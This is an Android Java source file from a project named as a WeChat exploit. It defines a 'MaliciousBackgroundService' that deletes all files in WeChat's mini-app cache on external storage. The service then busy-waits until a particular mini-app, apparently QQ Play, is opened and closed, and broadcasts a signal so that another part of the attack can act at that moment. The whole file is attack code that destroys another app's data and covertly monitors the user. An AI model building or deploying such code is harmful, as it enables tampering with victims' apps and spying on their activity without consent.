package com.example.wechatexploit;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import java.io.File;

public class MaliciousBackgroundService extends IntentService {

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public MaliciousBackgroundService() {
        super("MaliciousBackgroundService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.w("MBS", "Successfully started intentService");
        boolean found = false;
        Boolean isSDPresent = android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
        String id = "060fcd179da3b367fd750e10c172f0fd";

        if (isSDPresent) {
            Log.w("MBS", "SD card");
            File storage = Environment.getExternalStorageDirectory();
            Log.w("MBS", storage.getPath());
            File root = new File(storage, "tencent/MicroMsg/wxacache");
            Log.w("MBS", root.getPath());

            // Remove everything in the cache
            for (File file : root.listFiles()) {
                file.delete();
            }

            // Look for QQ play until it appears
            while (!found) {
                for (File file : root.listFiles()) {
                    if (file.getName().equals(id)) {
                        found = true;
                        Log.w("MBS", "Successfully found QQ Play");
                    }
                }
            }

            //Count number of existing pngs
            int oldAmount = 0;
            int newAmount = 0;
            for (File file : root.listFiles()) {
                oldAmount++;
            }

            //Wait for five more apps to appear
            while (newAmount < oldAmount + 5) {
                newAmount = 0;
                for (File file : root.listFiles()) {
                    newAmount++;
                }
            }
            Log.w("MBS", "QQ Play closed");

            //Send broadcast that qq play closed. if this doesn't work look into starting a new activity
            Intent intent1 = new Intent();
            intent1.setAction("QQ Play closed");
            sendBroadcast(intent1);
        } else {
            Log.w("MBS", "No SD card, can't do anything");
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.w("MBS", "MyIntentService onCreate() method is invoked.");
    }
}
